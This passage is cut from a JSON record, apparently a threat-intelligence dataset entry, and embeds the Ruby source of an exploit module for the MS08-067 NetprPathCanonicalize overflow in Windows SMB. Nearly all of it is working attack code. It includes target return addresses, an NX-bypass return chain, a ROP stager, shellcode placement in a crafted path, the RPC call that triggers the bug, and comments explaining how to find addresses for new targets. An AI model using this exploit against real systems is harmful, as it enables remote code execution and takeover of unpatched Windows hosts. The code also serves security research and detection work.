2003 SP2 Russian (NX)',\n            {\n              'RetDec'    => 0x7c97beb8,  # dec ESI, ret @NTDLL.DLL\n              'RetPop'    => 0x7cb2e84e,  # push ESI, pop EBP, ret @SHELL32.DLL\n              'JmpESP'    => 0x7c97a01b,  # jmp ESP @NTDLL.DLL\n              'DisableNX' => 0x7c94f517,  # NX disable @NTDLL.DLL\n              'Scratch'   => 0x00020408,\n            }\n          ],\n\n          # Brett Moore's crafty NX bypass for 2003 SP2\n          [ 'Windows 2003 SP2 Swedish (NX)',\n            {\n              'RetDec'    => 0x7c97beb8,  # dec ESI, ret @NTDLL.DLL\n              'RetPop'    => 0x7cb2e84e,  # push ESI, pop EBP, ret @SHELL32.DLL\n              'JmpESP'    => 0x7c97a01b,  # jmp ESP @NTDLL.DLL\n              'DisableNX' => 0x7c94f517,  # NX disable @NTDLL.DLL\n              'Scratch'   => 0x00020408,\n            }\n          ],\n\n          # Brett Moore's crafty NX bypass for 2003 SP2\n          [ 'Windows 2003 SP2 Turkish (NX)',\n            {\n              'RetDec'    => 0x7c96beb8,  # dec ESI, ret @NTDLL.DLL\n              'RetPop'    => 0x7cb1e84e,  # push ESI, pop EBP, ret @SHELL32.DLL\n              'JmpESP'    => 0x7c96a01b,  # jmp ESP @NTDLL.DLL\n              'DisableNX' => 0x7c93f517,  # NX disable @NTDLL.DLL\n              'Scratch'   => 0x00020408,\n            }\n          ],\n\n          #\n          # Missing Targets\n          # Key:   T=TODO   ?=UNKNOWN   U=UNRELIABLE\n          #\n          # [?] Windows Vista SP0 - Not tested yet\n          # [?] Windows Vista SP1 - Not tested yet\n          #\n        ],\n\n      'DisclosureDate' => '2008-10-28'))\n\n    register_options(\n      [\n        OptString.new('SMBPIPE', [true,  'The pipe name to use (BROWSER, SRVSVC)', 'BROWSER']),\n      ])\n\n    deregister_options('SMB::ProtocolVersion')\n  end\n\n  #\n  #\n  #   *** WINDOWS XP SP2/SP3 TARGETS ***\n  #\n  #\n  #   This exploit bypasses NX/NX by returning to a function call inside acgenral.dll that disables NX\n  #   for the process and then returns back to a call ESI instruction. These addresses are different\n  #   between operating systems, service packs, and language packs, but the steps below can be used to\n  #   add new targets.\n  #\n  #\n  #   If the target system does not have NX/NX, just place a \"call ESI\" return into both the Ret\tand\n  #   DisableNX elements of the target hash.\n  #\n  #   If the target system does have NX/NX, obtain a copy of the acgenral.dll from that system.\n  #   First obtain the value for the Ret element of the hash with the following command:\n  #\n  #   $ msfpescan -j esi acgenral.dll\n  #\n  #   Pick whatever address you like, just make sure it does not contain 00 0a 0d 5c 2f or 2e.\n  #\n  #   Next, find the location of the function we use to disable NX. Use the following command:\n  #\n  #   $ msfpescan -r \"\\x6A\\x04\\x8D\\x45\\x08\\x50\\x6A\\x22\\x6A\\xFF\" acgenral.dll\n  #\n  #   This address should be placed into the DisableNX element of the target hash.\n  #\n  #   The Scratch element of 0x00020408 should work on all versions of Windows\n  #\n  #   The actual function we use to disable NX looks like this:\n  #\n  #     push    4\n  #     lea     eax, [ebp+arg_0]\n  #     push    eax\n  #     push    22h\n  #     push    0FFFFFFFFh\n  #     mov     [ebp+arg_0], 2\n  #     call    ds:__imp__NtSetInformationProcess@16\n  #\n  #\n  #   *** WINDOWS XP NON-NX TARGETS ***\n  #\n  #\n  #   Instead of bypassing NX, just return directly to a \"JMP ESI\", which takes us to the short\n  #   jump, and finally the shellcode.\n  #\n  #\n  #   *** WINDOWS 2003 SP2 TARGETS ***\n  #\n  #\n  #   There are only two possible ways to return to NtSetInformationProcess on Windows 2003 SP2,\n  #   both of these are inside NTDLL.DLL and use a return method that is not directly compatible\n  #   with our call stack. To solve this, Brett Moore figured out a multi-step return call chain\n  #   that eventually leads to the NX bypass function.\n  #\n  #\n  #   *** WINDOWS 2000 TARGETS ***\n  #\n  #\n  #   No NX to bypass, just return directly to a \"JMP EDX\", which takes us to the short\n  #   jump, and finally the shellcode.\n  #\n  #\n  #   *** WINDOWS VISTA TARGETS ***\n  #\n  #   Currently untested, will involve ASLR and NX, should be fun.\n  #\n  #\n  #   *** NetprPathCanonicalize IDL ***\n  #\n  #\n  #   NET_API_STATUS NetprPathCanonicalize(\n  #   [in, string, unique] SRVSVC_HANDLE ServerName,\n  #   [in, string] WCHAR* PathName,\n  #   [out, size_is(OutbufLen)] unsigned char* Outbuf,\n  #   [in, range(0,64000)] DWORD OutbufLen,\n  #   [in, string] WCHAR* Prefix,\n  #   [in, out] DWORD* PathType,\n  #   [in] DWORD Flags\n  #   );\n  #\n\n  def exploit\n    begin\n      connect(versions: [1])\n      smb_login\n    rescue Rex::Proto::SMB::Exceptions::LoginError => e\n      if e.message =~ /Connection reset/\n        print_error('Connection reset during login')\n        print_error('This most likely means a previous exploit attempt caused the service to crash')\n        return\n      else\n        raise e\n      end\n    end\n\n    # Use a copy of the target\n    mytarget = target\n\n    if target['auto']\n\n      mytarget = nil\n\n      print_status('Automatically detecting the target...')\n      fprint = smb_fingerprint\n\n      print_status(\"Fingerprint: #{fprint['os']} - #{fprint['sp']} - lang:#{fprint['lang']}\")\n\n      # Bail early on unknown OS\n      if (fprint['os'] == 'Unknown')\n        fail_with(Failure::NoTarget, 'No matching target')\n      end\n\n      # Windows 2000 is mostly universal\n      if (fprint['os'] == 'Windows 2000')\n        mytarget = targets[1]\n      end\n\n      # Windows XP SP0/SP1 is mostly universal\n      if fprint['os'] == 'Windows XP' and fprint['sp'] == 'Service Pack 0 / 1'\n        mytarget = targets[2]\n      end\n\n      # Windows 2003 SP0 is mostly universal\n      if fprint['os'] == 'Windows 2003' and fprint['sp'].empty?\n        mytarget = targets[3]\n      end\n\n      # Windows 2003 R2 is treated the same as 2003\n      if (fprint['os'] == 'Windows 2003 R2')\n        fprint['os'] = 'Windows 2003'\n      end\n\n      # Service Pack match must be exact\n      if (not mytarget) and fprint['sp'].index('+')\n        print_error('Could not determine the exact service pack')\n        print_error(\"Auto-targeting failed, use 'show targets' to manually select one\")\n        disconnect\n        return\n      end\n\n      # Language Pack match must be exact or we default to English\n      if (not mytarget) and fprint['lang'] == 'Unknown'\n        print_status('We could not detect the language pack, defaulting to English')\n        fprint['lang'] = 'English'\n      end\n\n      # Normalize the service pack string\n      fprint['sp'].gsub!(/Service Pack\\s+/, 'SP')\n\n      unless mytarget\n        targets.each do |t|\n          # Prefer AlwaysOn NX over NX, and NX over non-NX\n          if t.name =~ /#{fprint['os']} #{fprint['sp']} #{fprint['lang']} \\(AlwaysOn NX\\)/\n            mytarget = t\n            break\n          end\n          if t.name =~ /#{fprint['os']} #{fprint['sp']} #{fprint['lang']} \\(NX\\)/\n            mytarget = t\n            break\n          end\n        end\n      end\n\n      unless mytarget\n        fail_with(Failure::NoTarget, 'No matching target')\n      end\n\n      print_status(\"Selected Target: #{mytarget.name}\")\n    end\n\n    #\n    # Build the malicious path name\n    #\n\n    padder = [*('A'..'Z')]\n    pad = 'A'\n    while pad.length < 7\n      c = padder[rand(padder.length)]\n      next if pad.index(c)\n      pad += c\n    end\n\n    prefix = '\\\\'\n    path   = ''\n    server = Rex::Text.rand_text_alpha(rand(8) + 1).upcase\n\n    #\n    # Windows 2003 SP2 (NX) targets\n    #\n    if mytarget['RetDec']\n\n      jumper = Rex::Text.rand_text_alpha(70).upcase\n      jumper[ 0, 4] = [mytarget['RetDec']].pack('V') # one more to Align and make room\n\n      jumper[ 4, 4] = [mytarget['RetDec']].pack('V') # 4 more for space\n      jumper[ 8, 4] = [mytarget['RetDec']].pack('V')\n      jumper[ 12, 4] = [mytarget['RetDec']].pack('V')\n      jumper[ 16, 4] = [mytarget['RetDec']].pack('V')\n\n      jumper[ 20, 4] = [mytarget['RetPop']].pack('V') # pop to EBP\n      jumper[ 24, 4] = [mytarget['DisableNX']].pack('V')\n\n      jumper[ 56, 4] = [mytarget['JmpESP']].pack('V')\n      jumper[ 60, 4] = [mytarget['JmpESP']].pack('V')\n      jumper[ 64, 2] = \"\\xeb\\x02\"                    # our jump\n      jumper[ 68, 2] = \"\\xeb\\x62\"                    # original\n\n      path =\n        Rex::Text.to_unicode('\\\\') +\n\n        # This buffer is removed from the front\n        Rex::Text.rand_text_alpha(100) +\n\n        # Shellcode\n        payload.encoded +\n\n        # Relative path to trigger the bug\n        Rex::Text.to_unicode('\\\\..\\\\..\\\\') +\n\n        # Extra padding\n        Rex::Text.to_unicode(pad) +\n\n        # Writable memory location (static)\n        [mytarget['Scratch']].pack('V') + # EBP\n\n        # Return to code which disables NX (or just the return)\n        [mytarget['RetDec']].pack('V') +\n\n        # Padding with embedded jump\n        jumper +\n\n        # NULL termination\n        \"\\x00\" * 2\n\n    #\n    # Windows XP SP2/SP3 ROP Stager targets\n    #\n    elsif mytarget['UseROP']\n\n      rop = generate_rop(mytarget['UseROP'])\n\n      path =\n        Rex::Text.to_unicode('\\\\') +\n\n        # This buffer is removed from the front\n        Rex::Text.rand_text_alpha(100) +\n\n        # Shellcode\n        payload.encoded +\n\n        # Relative path to trigger the bug\n        Rex::Text.to_unicode('\\\\..\\\\..\\\\') +\n\n        # Extra padding\n        Rex::Text.to_unicode(pad) +\n\n        # ROP Stager\n        rop +\n\n        # Padding (skipped)\n        Rex::Text.rand_text_alpha(2) +\n\n        # NULL termination\n        \"\\x00\" * 2\n\n    #\n    # Windows 2000, XP (NX), and 2003 (NO NX) targets\n    #\n    else\n\n      jumper = Rex::Text.rand_text_alpha(70).upcase\n      jumper[ 4, 4] = [mytarget.ret].pack('V')\n      jumper[50, 8] = make_nops(8)\n      jumper[58, 2] = \"\\xeb\\x62\"\n\n      path =\n        Rex::Text.to_unicode('\\\\') +\n\n        # This buffer is removed from the front\n        Rex::Text.rand_text_alpha(100) +\n\n        # Shellcode\n        payload.encoded +\n\n        # Relative path to trigger the bug\n        Rex::Text.to_unicode('\\\\..\\\\..\\\\') +\n\n        # Extra padding\n        Rex::Text.to_unicode(pad) +\n\n        # Writable memory location (static)\n        [mytarget['Scratch']].pack('V') + # EBP\n\n        # Return to code which disables NX (or just the return)\n        [mytarget['DisableNX'] || mytarget.ret].pack('V') +\n\n        # Padding with embedded jump\n        jumper +\n\n        # NULL termination\n        \"\\x00\" * 2\n\n    end\n\n    handle = dcerpc_handle(\n      '4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0',\n      'ncacn_np', [\"\\\\#{datastore['SMBPIPE']}\"]\n    )\n\n    dcerpc_bind(handle)\n\n    stub =\n      NDR.uwstring(server) +\n      NDR.UnicodeConformantVaryingStringPreBuilt(path) +\n      NDR.long(rand(1024)) +\n      NDR.wstring(prefix) +\n      NDR.long(4097) +\n      NDR.long(0)\n\n    # NOTE: we don't bother waiting for a response here...\n    print_status('Attempting to trigger the vulnerability...')\n    dcerpc.call(0x1f, stub, false)\n\n    # Cleanup\n    handler\n    disconnect\n  end\n\n  def check\n    begin\n      connect(versions: [1])\n      smb_login\n    rescue Rex::ConnectionError => e\n      vprint_error(\"Connection failed: #{e.class}: #{e}\")\n      return Msf::Exploit::CheckCode::Unknown\n    rescue Rex::Proto::SMB::Exceptions::LoginError => e\n      if e.message =~ /Connection reset/\n        vprint_error('Connection reset during login')\n        vprint_error('This most likely means a previous exploit attempt caused the service to crash')\n        return Msf::Exploit::CheckCode::Unknown\n      else\n        raise e\n      end\n    end\n\n    #\n    # Build the malicious path name\n    # 5b878ae7 \"db @eax;g\"\n    prefix = '\\\\'\n    path =\n      \"\\x00\\\\\\x00/\" * 0x10 +\n      Rex::Text.to_unicode('\\\\') +\n      Rex::Text.to_unicode('R7') +\n      Rex::Text.to_unicode('\\\\..\\\\..\\\\') +\n      Rex::Text.to_unicode('R7') +\n      \"\\x00\" * 2\n\n    server = Rex::Text.rand_text_alpha(rand(8) + 1).upcase\n\n    handle = dcerpc_handle('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0',\n                           'ncacn_np', [\"\\\\#{datastore['SMBPIPE']}\"]\n    )\n\n    begin\n      # Samba doesn't have this handle and returns an ErrorCode\n      dcerpc_bind(handle)\n    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e\n      vprint_error(\"SMB error: #{e.message}\")\n      return Msf::Exploit::CheckCode::Safe\n    end\n\n    vprint_status('Verifying vulnerable status... (path: 0x%08x)' % path.length)\n\n    stub =\n      NDR.uwstring(server) +\n      NDR.UnicodeConformantVaryingStringPreBuilt(path) +\n      NDR.long(8) +\n      NDR.wstring(prefix) +\n      NDR.long(4097) +\n      NDR.long(0)\n\n    resp = dcerpc.call(0x1f, stub)\n    error = resp[4, 4].unpack('V')[0]\n\n    # Cleanup\n    simple.client.close\n    simple.client.tree_disconnect\n    disconnect\n\n    if (error == 0x0052005c) # \\R :)\n      return Msf::Exploit::CheckCode::Vulnerable\n    else\n      vprint_error('System is not vulnerable (status: 0x%08x)' % error) if error\n      return Msf::Exploit::CheckCode::Safe\n    end\n  end\n\n  def generate_rop(version)\n    free_byte = \"\\x90\"\n    # free_byte = \"\\xcc\"\n\n    # create a few small gadgets\n    #  <free byte>; pop edx; pop ecx; ret\n    gadget1 = free_byte + \"\\x5a\\x59\\xc3\"\n    #  mov edi, eax; add edi,0xc; push 0x40; pop ecx; rep movsd\n    gadget2 = free_byte + \"\\x89\\xc7\" + \"\\x83\\xc7\\x0c\" + \"\\x6a\\x7f\" + \"\\x59\" + \"\\xf2\\xa5\" + free_byte\n    #  <must complete \\x00 two byte opcode>; <free_byte>; jmp $+0x5c\n    gadget3 = \"\\xcc\" + free_byte + \"\\xeb\\x5a\"\n\n    # gadget2:\n    #  get eax into edi\n    #  adjust edi\n    #  get 0x7f in ecx\n    #  copy the data\n    #  jmp to it\n    #\n    dws = gadget2.unpack('V*')\n\n    ##\n    # Create the ROP stager, pfew.. Props to corelanc0d3r!\n    # This was no easy task due to space limitations :-/\n    # -jduck\n    ##\n    module_name = 'ACGENRAL.DLL'\n    module_base = 0x6f880000\n\n    rvasets = {}\n    # XP SP2\n    rvasets['5.1.2600.2180'] = {\n      # call [imp_HeapCreate] / mov [0x6f8b8024], eax / ret\n      'call_HeapCreate'                          => 0x21064,\n      'add eax, ebp / mov ecx, 0x59ffffa8 / ret' => 0x2e546,\n      'pop ecx / ret'                            => 0x2e546 + 6,\n      'mov [eax], ecx / ret'                     => 0xd182,\n      'jmp eax'                                  => 0x19b85,\n      'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret' => 0x10976,\n      'mov [eax+0x10], ecx / ret'                => 0x10976 + 6,\n      'add eax, 8 / ret'                         => 0x29a14\n    }\n\n    # XP SP3\n    rvasets['5.1.2600.5512'] = {\n      # call [imp_HeapCreate] / mov [0x6f8b02c], eax / ret\n      'call_HeapCreate'                          => 0x21286,\n      'add eax, ebp / mov ecx, 0x59ffffa8 / ret' => 0x2e796,\n      'pop ecx / ret'                            => 0x2e796 + 6,\n      'mov [eax], ecx / ret'                     => 0xd296,\n      'jmp eax'                                  => 0x19c6f,\n      'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret' => 0x10a56,\n      'mov [eax+0x10], ecx / ret'                => 0x10a56 + 6,\n      'add eax, 8 / ret'                         => 0x29c64\n    }\n\n    # HeapCreate ROP Stager from ACGENRAL.DLL 5.1.2600.2180\n    rop = [\n      # prime ebp (adjustment distance)\n      0x00018000,\n\n      # get some RWX memory via HeapCreate\n      'call_HeapCreate',\n      0x01040110, # flOptions (gets & with 0x40005)\n      0x01010101,\n      0x01010101,\n\n      # adjust the returned pointer\n      'add eax, ebp / mov ecx, 0x59ffffa8 / ret',\n\n      # setup gadget1\n      'pop ecx / ret',\n      gadget1.unpack('V').first,\n      'mov [eax], ecx / ret',\n\n      # execute gadget1\n      'jmp eax',\n\n      # setup gadget2 (via gadget1)\n      dws[0],\n      dws[1],\n      'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret',\n\n      # setup part3 of gadget2\n      'pop ecx / ret',\n      dws[2],\n      'mov [eax+0x10], ecx / ret',\n\n      # execute gadget2\n      'add eax, 8 / ret',\n      'jmp eax',\n\n      # gadget3 gets executed after gadget2 (luckily)\n      gadget3.unpack('V').first\n    ]\n\n    # convert the meta rop into concrete bytes\n    rvas = rvasets[version]\n\n    rop.map! { |e|\n      if e.kind_of? String\n        # Meta-replace (RVA)\n        fail_with(Failure::BadConfig, \"Unable to locate key: \\\"#{e}\\\"\") unless rvas[e]\n        module_base + rvas[e]\n\n      elsif e == :unused\n        # Randomize\n        rand_text(4).unpack('V').first\n\n      else\n        # Literal\n        e\n      end\n    }\n\n    ret = rop.pack('V*')\n\n    # check badchars?\n    # idx = Rex::Text.badchar_index(ret, payload_badchars)\n\n    ret\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-10-28",
    "x_mitre_platforms": [
        "win'"
    ]
}